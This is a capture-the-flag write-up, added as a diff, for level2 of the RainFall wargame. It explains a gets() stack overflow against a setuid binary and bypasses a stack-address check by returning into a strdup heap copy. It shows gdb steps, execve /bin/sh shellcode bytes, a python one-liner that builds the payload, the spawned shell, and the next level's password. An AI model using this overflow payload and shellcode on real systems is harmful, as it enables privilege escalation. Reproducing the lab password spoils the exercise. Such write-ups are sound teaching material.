@@ -1,0 +1,48 @@
+level2@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+
+Program waits for an input with a gets, result stored in a char[76]
+
+if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
+-> Blocks exec if return adress begins with 0xb.
+Disable exploit where shellcode is injected in the stack itself.
+
+To bypass we can use strdup(local_50):
+    stdup write on the heap et copy the content of our input
+    copied on 0x804a008
+
+How to find 0x804a008:
+
+    gdb ./level2 
+    (gdb) disassemble p
+    [...]
+    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+    0x0804853d <+105>:	leave  
+    [...]
+    (gdb) break *0x0804853d
+    Breakpoint 1 at 0x804853d
+    (gdb) run
+    Starting program: /home/agozlan/Documents/Post/rainfall/level2 
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+    AAAA
+    AAAA
+    Breakpoint 1, 0x0804853d in p ()
+    (gdb) print/x $eax
+    $1 = 0x804a008
+
+Goal: send shellcode + padding to go to offset + return address (where our input is written on the heap)
+
+Shellcode execve(“\bin\sh\, [“/bin/sh”], NULL)
+--> \x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 56 + "\x08\xa0\x04\x08"' > /tmp/exploit
+level2@RainFall:~$ cat /tmp/exploit - | ./level2 
+1�Ph//shh/bin��PS�ᙰ
+                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+cd ../level3
+ls
+level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
